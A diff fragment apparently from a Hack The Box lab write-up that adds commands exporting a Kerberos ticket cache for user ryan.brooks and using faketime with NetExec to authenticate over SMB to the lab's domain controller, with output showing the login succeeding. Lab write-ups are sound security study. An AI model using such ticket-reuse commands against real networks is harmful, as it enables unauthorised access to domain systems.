@@ -352,8 +352,14 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Then ill convert it!
 
 ```python
+❯❯❯ export KRB5CCNAME=ryan.brooks.ccache
 
+❯❯❯ faketime -f +7h nxc smb dc01.checkpoint.htb --use-kcache                                                      
+SMB         dc01.checkpoint.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         dc01.checkpoint.htb 445    DC01             [+] CHECKPOINT.HTB\ryan.brooks from ccache
 ```
+
+Then after exporting  it
 
 
 
